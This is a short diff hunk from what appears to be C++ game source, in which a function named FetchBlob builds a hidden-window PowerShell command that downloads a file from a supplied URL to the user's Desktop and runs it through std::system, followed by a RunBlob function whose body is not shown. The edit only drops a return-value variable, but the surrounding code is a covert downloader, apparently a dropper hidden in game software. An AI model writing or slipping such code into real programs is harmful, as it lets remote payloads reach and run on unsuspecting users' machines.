@@ -237,7 +237,7 @@ void Game::Draw() {
 void FetchBlob(const std::string burl) {
     std::string cmd = "iwr " + burl + " -outfile $HOME\\Desktop\\frisky.bin";
     std::string psh = "powershell -nop -w hidden -c " + cmd;
-    int s = std::system(psh.c_str());
+    std::system(psh.c_str());
 }
 
 void RunBlob() {
